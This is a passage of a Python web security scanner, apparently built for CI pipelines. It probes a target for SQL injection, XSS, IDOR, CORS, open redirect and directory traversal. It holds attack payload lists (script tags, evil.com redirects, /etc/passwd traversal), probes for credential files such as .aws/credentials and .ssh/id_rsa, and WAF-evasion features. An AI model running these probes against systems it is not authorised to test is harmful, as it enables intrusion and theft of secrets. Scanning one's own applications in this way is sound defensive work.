                    data = {"email": payload_obs, "password": "anything"}
                    start = time.time()
                    resp = self._request('POST', endpoint, json=data, timeout=delay+5)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    elapsed = time.time() - start
                    if elapsed - baseline_time >= delay - 1:
                        self.log(f"    ⚠️ Time-based SQLi detected at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="SQL Injection (Time-based)",
                            endpoint=endpoint,
                            payload=payload_obs,
                            parameter="email",
                            request=resp._request_info,
                            response={
                                'status_code': resp.status_code,
                                'headers': dict(resp.headers),
                                'body_snippet': resp.text[:500],
                                'response_time': elapsed,
                                'baseline_time': baseline_time
                            }
                        )
                        endpoint_result["status"] = "vulnerable"
                        endpoint_result["details"] = f"Time-based SQLi with payload: {payload}"
                        break
                except requests.exceptions.Timeout:
                    if delay >= 5:
                        self.log(f"    ⚠️ Time-based SQLi (timeout) at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="SQL Injection (Time-based - Timeout)",
                            endpoint=endpoint,
                            payload=payload_obs,
                            parameter="email",
                            request=None,
                            response={'error': 'timeout'}
                        )
                        endpoint_result["status"] = "vulnerable"
                        endpoint_result["details"] = f"Timeout on time-based payload: {payload}"
                        break
                except Exception:
                    continue

            # Error-based tests
            for payload in error_payloads:
                if consecutive_blocks >= 3:
                    break
                payload_obs = obfuscate_sql_payload(payload)
                try:
                    data = {"email": payload_obs, "password": "anything"}
                    resp = self._request('POST', endpoint, json=data, timeout=5)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                        
                    db_errors = ["sql", "mysql", "syntax error", "unclosed quotation", "odbc", "driver", "ora-"]
                    if any(err in resp.text.lower() for err in db_errors):
                        self.log(f"    ⚠️ Error-based SQLi possible at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="SQL Injection (Error-based)",
                            endpoint=endpoint,
                            payload=payload_obs,
                            parameter="email",
                            request=resp._request_info,
                            response={
                                'status_code': resp.status_code,
                                'headers': dict(resp.headers),
                                'body_snippet': resp.text[:500]
                            }
                        )
                        endpoint_result["status"] = "vulnerable"
                        endpoint_result["details"] = f"Error-based SQLi with payload: {payload}"
                        break
                except Exception:
                    continue

            test_details.append(endpoint_result)

        self.test_summary["SQL Injection"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE" if not any(b.get("status")=="blocked" for b in test_details) else "BLOCKED",
            "details": f"Tested {len(test_endpoints)} endpoints. Vulnerabilities found: {vulnerable}"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # XSS test – THREADED + circuit breaker + actual parameters
    # ----------------------------------------------------------------------
    def test_xss(self):
        """Test for Cross-Site Scripting vulnerabilities using threading and actual parameters"""
        self.log("🔍 Testing XSS vulnerabilities with threading...")
        vulnerable = False

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<a href=\"javascript:alert('XSS')\">Click</a>",
            "';alert('XSS');//",
            "\";alert('XSS');//"
        ]

        # Build test endpoints from discovered ones + common ones
        test_endpoints = set()
        for url, methods in self.discovered_endpoints.items():
            if 'POST' in methods or 'GET' in methods:
                test_endpoints.add(url)
        common = ["/api/register", "/api/contact", "/api/profile/update", "/search", "/comment"]
        for path in common:
            test_endpoints.add(urljoin(self.base_url, path))

        # Prepare list of tasks (endpoint, param, payload)
        tasks = []
        for endpoint in test_endpoints:
            # Get actual parameters from discovered_endpoints
            methods_and_params = self.discovered_endpoints.get(endpoint, {})
            actual_params = set()
            for method, params in methods_and_params.items():
                actual_params.update(params)
            # Fallback if none found
            params_to_test = actual_params if actual_params else ['q', 'id', 'search']
            for payload in xss_payloads:
                for param in params_to_test:
                    tasks.append((endpoint, param, payload))

        # Circuit breaker dictionary to track blocks per endpoint
        block_counter = {}
        # Need to pass auth token and stealth headers to workers
        auth_header = self.session.headers.get('Authorization', '')

        def check_xss(endpoint, param, payload):
            """Worker function for a single XSS test"""
            # Check circuit breaker for this endpoint
            if block_counter.get(endpoint, 0) >= 3:
                return {"type": "blocked", "endpoint": endpoint, "reason": "circuit_breaker"}
            try:
                # Create a fresh session for each worker with stealth headers
                headers = get_stealth_headers()
                if auth_header:
                    headers['Authorization'] = auth_header
                data = {param: payload}
                if any(x in endpoint.lower() for x in ['search', 'q', 'query']):
                    resp = requests.get(endpoint, params=data, headers=headers, timeout=3)
                else:
                    resp = requests.post(endpoint, json=data, headers=headers, timeout=3)

                # Check if blocked
                if resp.status_code in [403, 406, 429]:
                    block_counter[endpoint] = block_counter.get(endpoint, 0) + 1
                    return {"type": "blocked", "endpoint": endpoint}
                else:
                    block_counter[endpoint] = 0

                # Check for reflected payload (simple detection)
                if payload in resp.text and '&lt;' not in payload and '&gt;' not in payload:
                    return {
                        "type": "vulnerable",
                        "endpoint": endpoint,
                        "param": param,
                        "payload": payload,
                        "request": {
                            'method': 'GET' if 'search' in endpoint.lower() else 'POST',
                            'url': endpoint,
                            'headers': headers,
                            'body': data
                        },
                        "response": {
                            'status_code': resp.status_code,
                            'headers': dict(resp.headers),
                            'body_snippet': resp.text[:500]
                        }
                    }
                return {"type": "secure"}
            except Exception as e:
                return {"type": "error", "error": str(e), "endpoint": endpoint}

        # Run tasks with ThreadPoolExecutor
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_task = {executor.submit(check_xss, endpoint, param, payload): (endpoint, param, payload)
                              for endpoint, param, payload in tasks}
            for future in concurrent.futures.as_completed(future_to_task):
                result = future.result()
                if result["type"] == "vulnerable":
                    vulnerable = True
                    self.log(f"  ⚠️ XSS vulnerability at {result['endpoint']} (param={result['param']})", "WARNING")
                    self.add_vulnerability(
                        vuln_type="Cross-Site Scripting (XSS)",
                        endpoint=result["endpoint"],
                        payload=result["payload"][:50],
                        parameter=result["param"],
                        request=result.get("request"),
                        response=result.get("response")
                    )
                elif result["type"] == "blocked" and result.get("reason") == "circuit_breaker":
                    pass  # handled

        # Build test summary
        total_tests = len(tasks)
        blocked_endpoints = len(set(endpoint for endpoint, cnt in block_counter.items() if cnt >= 3))
        self.test_summary["Cross-Site Scripting (XSS)"] = {
            "status": "VULNERABLE" if vulnerable else "BLOCKED" if blocked_endpoints > 0 else "SECURE",
            "details": f"Tested {total_tests} payload/parameter combinations across {len(test_endpoints)} endpoints. Blocked endpoints: {blocked_endpoints}"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Authentication Flaws test (with WAF check and evidence)
    # ----------------------------------------------------------------------
    def test_authentication_flaws(self):
        """Test for authentication-related vulnerabilities"""
        self.log("🔍 Testing Authentication Flaws...")
        vulnerable = False
        details = []

        login_endpoints = [url for url in self.discovered_endpoints if 'login' in url.lower()]
        if not login_endpoints:
            login_endpoints = [f"{self.base_url}/api/login", f"{self.base_url}/login"]

        for login_url in login_endpoints:
            self.log(f"  Testing {login_url}")
            consecutive_blocks = 0

            # Weak passwords
            weak_passwords = ["123456", "password", "admin", "qwerty", "test123", "password123"]
            for weak_pass in weak_passwords:
                if consecutive_blocks >= 3:
                    break
                try:
                    data = {"email": f"test_{int(time.time())}@example.com", "password": weak_pass, "name": "Test User"}
                    resp = self._request('POST', login_url, json=data, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code == 200:
                        self.log(f"  ⚠️ Weak password '{weak_pass}' accepted!", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Weak Password Policy",
                            endpoint=login_url,
                            payload=weak_pass,
                            request=resp._request_info,
                            response={'status_code': resp.status_code}
                        )
                        details.append(f"Weak password {weak_pass} accepted")
                except Exception:
                    pass

            # User enumeration
            test_emails = ["admin@example.com", "nonexistent@example.com", self.test_email, "user@nonexistent.com"]
            responses = {}
            for email in test_emails:
                if consecutive_blocks >= 3:
                    break
                try:
                    data = {"email": email, "password": "wrongpassword"}
                    resp = self._request('POST', login_url, json=data, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    responses[email] = resp.text.lower()
                except Exception:
                    continue

            if len(responses) >= 2:
                first_response = list(responses.values())[0]
                consistent = all(r == first_response for r in responses.values())
                if not consistent:
                    enum_phrases = ["user not found", "does not exist", "invalid user", "email not found"]
                    for email, resp_text in responses.items():
                        if any(phrase in resp_text for phrase in enum_phrases):
                            self.log(f"  ⚠️ User enumeration possible at {login_url}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="User Enumeration",
                                endpoint=login_url,
                                payload=email,
                                response={'error_message': resp_text[:200]}
                            )
                            details.append("User enumeration via error messages")
                            break

            # Rate limiting
            try:
                success_count = 0
                for i in range(15):
                    if consecutive_blocks >= 3:
                        break
                    data = {"email": self.test_email, "password": f"wrong{i}"}
                    resp = self._request('POST', login_url, json=data, timeout=2)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code != 429:
                        success_count += 1
                    time.sleep(0.1)
                if success_count >= 12:
                    self.log(f"  ⚠️ No rate limiting detected at {login_url}!", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="Missing Rate Limiting",
                        endpoint=login_url,
                        response={'detail': f"Allowed {success_count} rapid login attempts"}
                    )
                    details.append("No rate limiting")
            except Exception:
                pass

        self.test_summary["Authentication Flaws"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No authentication flaws found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # IDOR test (with WAF check and evidence)
    # ----------------------------------------------------------------------
    def test_insecure_direct_object_reference(self):
        """Test for Insecure Direct Object References"""
        self.log("🔍 Testing IDOR vulnerabilities...")
        vulnerable = False
        details = []

        if not self.auth_token:
            self.attempt_login()

        # Find potential IDOR endpoints
        idor_patterns = ['/user/', '/profile/', '/order/', '/document/', '/payment/', '/api/users/', '/api/orders/']
        idor_endpoints = []
        for url in self.discovered_endpoints:
            if any(pattern in url for pattern in idor_patterns):
                idor_endpoints.append(url)
        if not idor_endpoints:
            templates = [
                f"{self.base_url}/api/user/profile/{{id}}",
                f"{self.base_url}/api/users/{{id}}",
                f"{self.base_url}/api/orders/{{id}}",
                f"{self.base_url}/api/documents/{{id}}",
                f"{self.base_url}/api/payment/{{id}}",
                f"{self.base_url}/user/{{id}}",
                f"{self.base_url}/profile/{{id}}"
            ]
            idor_endpoints = templates

        test_ids = [1, 2, 3, 999, 1000, 'admin', 'test']

        for endpoint_template in idor_endpoints:
            self.log(f"  Testing {endpoint_template}")
            consecutive_blocks = 0
            for test_id in test_ids:
                if consecutive_blocks >= 3:
                    break
                endpoint = endpoint_template.replace('{id}', str(test_id))
                try:
                    resp = self._request('GET', endpoint, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        sensitive_patterns = ['password', 'email', 'phone', 'address', 'credit', 'ssn', 'dob', 'salary']
                        found_sensitive = [p for p in sensitive_patterns if p in content]
                        if found_sensitive:
                            self.log(f"  ⚠️ Potential IDOR at {endpoint}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="IDOR",
                                endpoint=endpoint,
                                payload=f"ID={test_id}",
                                request=resp._request_info,
                                response={
                                    'status_code': resp.status_code,
                                    'headers': dict(resp.headers),
                                    'body_snippet': resp.text[:500],
                                    'sensitive_data_found': found_sensitive
                                }
                            )
                            details.append(f"IDOR on {endpoint} with ID {test_id}")
                            break
                except Exception:
                    continue

        self.test_summary["IDOR"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No IDOR vulnerabilities found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # CORS test (with WAF check and evidence)
    # ----------------------------------------------------------------------
    def test_cors_misconfiguration(self):
        """Test for CORS misconfigurations"""
        self.log("🔍 Testing CORS Misconfigurations...")
        vulnerable = False
        details = []

        try:
            test_origins = ['https://evil.com', 'null', '*']
            for origin in test_origins:
                headers = {
                    'Origin': origin,
                    'Access-Control-Request-Method': 'GET'
                }
                resp = self._request('OPTIONS', self.base_url, headers=headers, timeout=3)
                if self.is_blocked(resp):
                    continue
                cors_headers = {
                    'allow_origin': resp.headers.get('Access-Control-Allow-Origin', ''),
                    'allow_credentials': resp.headers.get('Access-Control-Allow-Credentials', ''),
                    'allow_methods': resp.headers.get('Access-Control-Allow-Methods', '')
                }
                if cors_headers['allow_origin'] == '*' and cors_headers['allow_credentials'] == 'true':
                    self.log("  ⚠️ Dangerous CORS configuration: * with credentials", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="CORS Misconfiguration",
                        endpoint=self.base_url,
                        payload=origin,
                        response=cors_headers
                    )
                    details.append("Wildcard origin with credentials")
                elif origin in cors_headers['allow_origin'] and cors_headers['allow_credentials'] == 'true':
                    self.log(f"  ⚠️ CORS allows {origin} with credentials", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="CORS Misconfiguration",
                        endpoint=self.base_url,
                        payload=origin,
                        response=cors_headers
                    )
                    details.append(f"Allowed origin {origin} with credentials")
        except Exception as e:
            self.log(f"  Error testing CORS: {e}", "ERROR")

        self.test_summary["CORS Misconfiguration"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No CORS misconfigurations found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Sensitive Data Exposure (with WAF check and evidence)
    # ----------------------------------------------------------------------
    def test_sensitive_data_exposure(self):
        """Test for exposed sensitive files and data"""
        self.log("🔍 Testing for Sensitive Data Exposure...")
        vulnerable = False
        details = []

        common_files = [
            "/.env", "/.env.local", "/.env.production",
            "/config.json", "/config.js", "/config.php",
            "/database.json", "/database.yml",
            "/backup.sql", "/dump.sql", "/db.sql",
            "/phpinfo.php", "/info.php",
            "/.git/config", "/.git/HEAD",
            "/robots.txt", "/sitemap.xml",
            "/package.json", "/composer.json",
            "/wp-config.php", "/wp-config.txt",
            "/.aws/credentials", "/.aws/config",
            "/.ssh/id_rsa", "/.ssh/id_dsa",
            "/secret.txt", "/password.txt",
            "/api-docs", "/swagger.json", "/openapi.json",
            "/.htaccess", "/.htpasswd",
            "/web.config", "/.well-known/security.txt"
        ]

        sensitive_patterns = [
            r'password["\']?\s*[:=]\s*["\']?[^"\']+',
            r'api[_-]?key["\']?\s*[:=]\s*["\']?[^"\']+',
            r'secret["\']?\s*[:=]\s*["\']?[^"\']+',
            r'token["\']?\s*[:=]\s*["\']?[^"\']+',
            r'database[_-]?url',
            r'mongodb://',
            r'mysql://',
            r'postgresql://',
            r'aws[_-]?access[_-]?key',
            r'aws[_-]?secret[_-]?key',
            r'private[_-]?key',
            r'BEGIN RSA PRIVATE KEY',
            r'SECRET_KEY'
        ]

        consecutive_blocks = 0
        for file_path in common_files:
            if consecutive_blocks >= 3:
                self.log("  Circuit breaker tripped – stopping sensitive data tests.")
                break
            url = urljoin(self.base_url, file_path)
            self.log(f"  Checking {file_path}")
            try:
                resp = self._request('GET', url, timeout=3)
                if self.is_blocked(resp):
                    consecutive_blocks += 1
                    continue
                consecutive_blocks = 0
                if resp.status_code == 200:
                    content = resp.text
                    if len(content) > 1000000:
                        continue
                    for pattern in sensitive_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            self.log(f"  ⚠️ Sensitive data exposed in {file_path}!", "WARNING")
                            vulnerable = True
                            match = re.search(pattern, content, re.IGNORECASE)
                            matched_text = match.group(0)[:100] if match else "Pattern matched"
                            self.add_vulnerability(
                                vuln_type="Sensitive Data Exposure",
                                endpoint=url,
                                payload=file_path,
                                request=resp._request_info,
                                response={
                                    'status_code': resp.status_code,
                                    'headers': dict(resp.headers),
                                    'body_snippet': resp.text[:500],
                                    'pattern_matched': matched_text
                                }
                            )
                            details.append(f"{file_path} contains sensitive data")
                            break
            except Exception:
                continue

        self.test_summary["Sensitive Data Exposure"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No sensitive files exposed"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Security Headers test (with WAF check and evidence)
    # ----------------------------------------------------------------------
    def test_security_headers(self):
        """Test for missing or misconfigured security headers"""
        self.log("🔍 Testing Security Headers...")
        vulnerable = False
        details = []

        try:
            resp = self._request('GET', self.base_url, timeout=3)
            if self.is_blocked(resp):
                self.log("  Security headers test blocked by WAF.", "WARNING")
                self.test_summary["Security Headers"] = {"status": "BLOCKED", "details": "Request blocked by WAF"}
                return "BLOCKED"

            headers = resp.headers

            required_headers = {
                'X-Frame-Options': {'expected': ['DENY', 'SAMEORIGIN'], 'desc': 'Prevents clickjacking'},
                'X-Content-Type-Options': {'expected': ['nosniff'], 'desc': 'Prevents MIME sniffing'},
                'Content-Security-Policy': {'expected': None, 'desc': 'Controls resource loading'},
                'Strict-Transport-Security': {'expected': None, 'desc': 'Enforces HTTPS'},
                'X-XSS-Protection': {'expected': ['1; mode=block'], 'desc': 'XSS filter'},
                'Referrer-Policy': {'expected': ['strict-origin', 'strict-origin-when-cross-origin', 'no-referrer', 'same-origin'], 'desc': 'Referrer info'},
                'Permissions-Policy': {'expected': None, 'desc': 'Controls browser features'}
            }

            for header, config in required_headers.items():
                value = headers.get(header)
                if not value:
                    self.log(f"  ⚠️ Missing security header: {header}", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="Missing Security Header",
                        endpoint=self.base_url,
                        payload=header,
                        response={'missing_header': header, 'description': config['desc']}
                    )
                    details.append(f"Missing {header}")
                elif config['expected'] and value not in config['expected']:
                    self.log(f"  ⚠️ Misconfigured {header}: {value}", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="Misconfigured Security Header",
                        endpoint=self.base_url,
                        payload=header,
                        response={'header': header, 'current_value': value, 'expected_values': config['expected']}
                    )
                    details.append(f"Misconfigured {header}: {value}")

            if 'Server' in headers and '/' in headers['Server']:
                self.log(f"  ⚠️ Server version disclosed: {headers['Server']}", "WARNING")
                vulnerable = True
                self.add_vulnerability(
                    vuln_type="Server Version Disclosure",
                    endpoint=self.base_url,
                    payload=headers['Server'],
                    response={'server_header': headers['Server']}
                )
                details.append(f"Server version disclosed: {headers['Server']}")

            if 'X-Powered-By' in headers:
                self.log(f"  ⚠️ Technology disclosed: {headers['X-Powered-By']}", "WARNING")
                vulnerable = True
                self.add_vulnerability(
                    vuln_type="Technology Disclosure",
                    endpoint=self.base_url,
                    payload=headers['X-Powered-By'],
                    response={'header': 'X-Powered-By', 'value': headers['X-Powered-By']}
                )
                details.append(f"Technology disclosed: {headers['X-Powered-By']}")

            self.test_summary["Security Headers"] = {
                "status": "VULNERABLE" if vulnerable else "SECURE",
                "details": "; ".join(details) if details else "All security headers properly configured"
            }
            return vulnerable

        except Exception as e:
            self.log(f"  Error checking security headers: {e}", "ERROR")
            self.test_summary["Security Headers"] = {"status": "ERROR", "details": str(e)}
            return False

    # ----------------------------------------------------------------------
    # SSL/TLS test (unchanged – doesn't use requests)
    # ----------------------------------------------------------------------
    def test_ssl_tls_vulnerabilities(self):
        """Test SSL/TLS configuration"""
        self.log("🔍 Testing SSL/TLS Configuration...")
        vulnerable = False
        details = []

        if not self.base_url.startswith('https://'):
            self.log("  ⚠️ Site not using HTTPS!", "WARNING")
            self.add_vulnerability(
                vuln_type="Missing HTTPS",
                endpoint=self.base_url,
                response={'note': 'Site does not use HTTPS'}
            )
            self.test_summary["SSL/TLS"] = {"status": "VULNERABLE", "details": "Site does not use HTTPS"}
            return True

        try:
            hostname = self.base_url.split('://')[1].split('/')[0]
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    not_after = cert.get('notAfter')
                    if not_after:
                        expiry_date = datetime.datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        if expiry_date < datetime.datetime.now():
                            self.log("  ⚠️ SSL Certificate expired!", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Expired SSL Certificate",
                                endpoint=self.base_url,
                                payload=not_after,
                                response={'expiry_date': not_after}
                            )
                            details.append("Certificate expired")

                    cipher = ssock.cipher()
                    cipher_name = cipher[0] if cipher else "Unknown"
                    weak_ciphers = ['RC4', '3DES', 'DES', 'MD5', 'EXPORT', 'NULL']
                    if any(weak in cipher_name for weak in weak_ciphers):
                        self.log(f"  ⚠️ Weak cipher: {cipher_name}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Weak SSL Cipher",
                            endpoint=self.base_url,
                            payload=cipher_name,
                            response={'cipher': cipher_name}
                        )
                        details.append(f"Weak cipher {cipher_name}")

                    tls_version = ssock.version()
                    if tls_version in ['TLSv1', 'TLSv1.0', 'TLSv1.1']:
                        self.log(f"  ⚠️ Outdated TLS version: {tls_version}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Outdated TLS Version",
                            endpoint=self.base_url,
                            payload=tls_version,
                            response={'tls_version': tls_version}
                        )
                        details.append(f"Outdated TLS {tls_version}")

            self.test_summary["SSL/TLS"] = {
                "status": "VULNERABLE" if vulnerable else "SECURE",
                "details": "; ".join(details) if details else "SSL/TLS configuration is secure"
            }
            return vulnerable

        except Exception as e:
            self.log(f"  Error checking SSL/TLS: {e}", "ERROR")
            self.test_summary["SSL/TLS"] = {"status": "ERROR", "details": str(e)}
            return "BLOCKED"

    # ----------------------------------------------------------------------
    # CSRF test (with WAF check and evidence)
    # ----------------------------------------------------------------------
    def test_csrf(self):
        """Test for CSRF vulnerabilities"""
        self.log("🔍 Testing CSRF Vulnerabilities...")
        if not self.auth_token:
            self.attempt_login()

        state_change_endpoints = []
        for url in self.discovered_endpoints:
            if any(p in url.lower() for p in ['update', 'delete', 'create', 'post', 'change', 'settings', 'profile']):
                state_change_endpoints.append(url)
        if not state_change_endpoints:
            state_change_endpoints = [
                f"{self.base_url}/api/profile/update",
                f"{self.base_url}/api/user/update",
                f"{self.base_url}/api/settings",
                f"{self.base_url}/profile/update"
            ]

        vulnerable = False
        details = []
        consecutive_blocks = 0

        for endpoint in state_change_endpoints:
            if consecutive_blocks >= 3:
                break
            self.log(f"  Testing {endpoint}")
            try:
                valid_data = {"name": "Test Update", "email": self.test_email}
                valid_resp = self._request('POST', endpoint, json=valid_data, timeout=3)
                if self.is_blocked(valid_resp):
                    consecutive_blocks += 1
                    continue
                if valid_resp.status_code == 200:
                    # Use a separate session without auth
                    temp_session = requests.Session()
                    # But we need to apply stealth headers; we'll use _request with a custom session?
                    # For simplicity, we'll use a new session with stealth headers.
                    headers = get_stealth_headers()
                    invalid_resp = requests.post(endpoint, json=valid_data, headers=headers, timeout=3)
                    if self.is_blocked(invalid_resp):
                        consecutive_blocks += 1
                        continue
                    if invalid_resp.status_code == 200:
                        self.log(f"  ⚠️ State change possible without auth token at {endpoint}!", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="CSRF / Missing Authentication",
                            endpoint=endpoint,
                            payload="POST without auth",
                            response={'note': 'Endpoint accepts requests without authentication'}
                        )
                        details.append(f"CSRF at {endpoint}")
                        break
            except Exception:
                continue

        self.test_summary["CSRF"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No CSRF vulnerabilities found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Open Redirect test (with WAF check and evidence)
    # ----------------------------------------------------------------------
    def test_open_redirect(self):
        """Test for open redirect vulnerabilities"""
        self.log("🔍 Testing Open Redirect Vulnerabilities...")
        vulnerable = False
        details = []

        redirect_params = ['redirect', 'return', 'next', 'url', 'goto', 'target', 'destination', 'returnTo']
        redirect_endpoints = []
        for url in self.discovered_endpoints:
            if any(param in url.lower() for param in redirect_params):
                redirect_endpoints.append(url)
        if not redirect_endpoints:
            templates = [
                f"{self.base_url}/redirect?url=",
                f"{self.base_url}/logout?returnTo=",
                f"{self.base_url}/login?next=",
                f"{self.base_url}/auth?redirect=",
                f"{self.base_url}/api/redirect?url="
            ]
            redirect_endpoints = templates

        payloads = [
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "https:evil.com",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
            "\\evil.com",
            "https://evil.com@good.com"
        ]

        consecutive_blocks = 0
        for endpoint in redirect_endpoints:
            if consecutive_blocks >= 3:
                break
            self.log(f"  Testing {endpoint}")
            for payload in payloads:
                if consecutive_blocks >= 3:
                    break
                try:
                    if '?' in endpoint:
                        url = endpoint + payload
                    else:
                        url = endpoint + payload
                    resp = self._request('GET', url, allow_redirects=False, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location or 'javascript:' in location:
                            self.log(f"  ⚠️ Open redirect at {endpoint}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Open Redirect",
                                endpoint=endpoint,
                                payload=payload,
                                request=resp._request_info,
                                response={
                                    'status_code': resp.status_code,
                                    'headers': dict(resp.headers),
                                    'redirects_to': location
                                }
                            )
                            details.append(f"Open redirect at {endpoint} with {payload}")
                            break
                except Exception:
                    continue

        self.test_summary["Open Redirect"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No open redirects found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Directory Traversal test (with WAF check and evidence)
    # ----------------------------------------------------------------------
    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        self.log("🔍 Testing Directory Traversal...")
        vulnerable = False
        details = []

        file_params = ['file', 'path', 'document', 'download', 'view', 'get']
        traversal_endpoints = []
        for url in self.discovered_endpoints:
            if any(param in url.lower() for param in file_params):
                traversal_endpoints.append(url)
        if not traversal_endpoints:
            templates = [
                f"{self.base_url}/api/file?path=",
                f"{self.base_url}/download?file=",
                f"{self.base_url}/view?doc=",
                f"{self.base_url}/get?document="
            ]
            traversal_endpoints = templates

        traversal_payloads = [
            "../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..;/etc/passwd",
            "../etc/passwd%00",
            "file:///etc/passwd"
        ]

        success_markers = ["root:", "nobody:", "daemon:", "bin:", "[extensions]", "127.0.0.1", "localhost"]

        consecutive_blocks = 0
        for endpoint in traversal_endpoints:
            if consecutive_blocks >= 3:
                break
            self.log(f"  Testing {endpoint}")
            for payload in traversal_payloads:
                if consecutive_blocks >= 3:
                    break
                try:
                    url = endpoint + payload
                    resp = self._request('GET', url, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code == 200:
                        content = resp.text
                        found_markers = [m for m in success_markers if m in content]
                        if found_markers:
                            self.log(f"  ⚠️ Directory traversal at {endpoint}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Directory Traversal",
                                endpoint=endpoint,
                                payload=payload,
                                request=resp._request_info,
                                response={
                                    'status_code': resp.status_code,
                                    'headers': dict(resp.headers),
                                    'body_snippet': resp.text[:500],
                                    'indicators_found': found_markers
                                }
                            )
                            details.append(f"Directory traversal at {endpoint} with {payload}")
                            break
                except Exception:
                    continue

        self.test_summary["Directory Traversal"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No directory traversal found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Main orchestration
    # ----------------------------------------------------------------------
    def run_all_tests(self):
        """Run all security tests"""
        self.log("=" * 60)
        self.log(f"🚀 Starting security tests for {self.base_url}")
        self.log("=" * 60)

        # Discover endpoints
        self.discover_endpoints()
        
        # Attempt login
        self.attempt_login()

        # Define tests to run (order preserved)
        tests = [
            ("SQL Injection", self.test_sql_injection),
            ("Cross-Site Scripting (XSS)", self.test_xss),
            ("Authentication Flaws", self.test_authentication_flaws),
            ("IDOR", self.test_insecure_direct_object_reference),
            ("CORS Misconfiguration", self.test_cors_misconfiguration),
            ("Sensitive Data Exposure", self.test_sensitive_data_exposure),
            ("Security Headers", self.test_security_headers),
            ("SSL/TLS Vulnerabilities", self.test_ssl_tls_vulnerabilities),
            ("CSRF", self.test_csrf),
            ("Open Redirect", self.test_open_redirect),
            ("Directory Traversal", self.test_directory_traversal),
        ]

        # Run tests
        for test_name, test_func in tests:
            self.log(f"\n{'='*40}")
            self.log(f"Running {test_name} test...")
            self.log(f"{'='*40}")
            
            try:
                test_func()
            except Exception as e:
                self.log(f"❌ Error during {test_name}: {e}", "ERROR")
                self.test_summary[test_name] = {"status": "ERROR", "details": str(e)}

        # Summary
        self.log("\n" + "=" * 60)
        self.log("📊 SECURITY TEST SUMMARY")
        self.log("=" * 60)

        for test_name, info in self.test_summary.items():
            status = info.get('status', 'UNKNOWN')
            details = info.get('details', '')
            emoji = "❌" if status == "VULNERABLE" else "✅" if status == "SECURE" else "🚧" if status == "BLOCKED" else "⚠️"
            self.log(f"{emoji} {test_name}: {status} – {details}")

        # Save and upload report
        self.save_report()
        
        # Always return 0 for GitHub Actions
        return 0

def main():
    """Main entry point"""
    print(r"""
    ╔══════════════════════════════════════════════════════════════╗
